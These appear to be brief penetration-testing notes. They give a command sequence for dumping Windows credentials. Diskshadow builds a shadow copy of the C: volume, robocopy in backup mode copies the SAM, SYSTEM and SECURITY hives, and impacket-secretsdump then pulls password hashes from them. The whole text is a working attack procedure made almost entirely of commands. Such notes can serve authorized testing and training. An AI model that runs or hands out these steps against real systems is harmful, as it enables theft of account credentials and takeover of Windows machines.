##
##
##
```
echo "set context persistent nowriters" | out-file ./diskshadow.txt -encoding ascii
echo "add volume c: alias temp" | out-file ./diskshadow.txt -encoding ascii -append
echo "create" | out-file ./diskshadow.txt -encoding ascii -append
echo "expose %temp% z:" | out-file ./diskshadow.txt -encoding ascii -append


ls to make sure there is diskshadow.txt and run:

diskshadow.exe /s c:\Windows\temp\diskshadow.txt


Then...

robocopy /b Z:\Windows\System32\Config C:\Windows\temp SAM
robocopy /b Z:\Windows\System32\Config C:\Windows\temp SYSTEM
robocopy /b Z:\Windows\System32\Config C:\Windows\temp SECURITY

```
##
##
##
```
Download 
SAM
SYSTEM
SECURITY


impacket-secretsdump -sam SAM -security SECURITY -system SYSTEM LOCAL
```

###
###
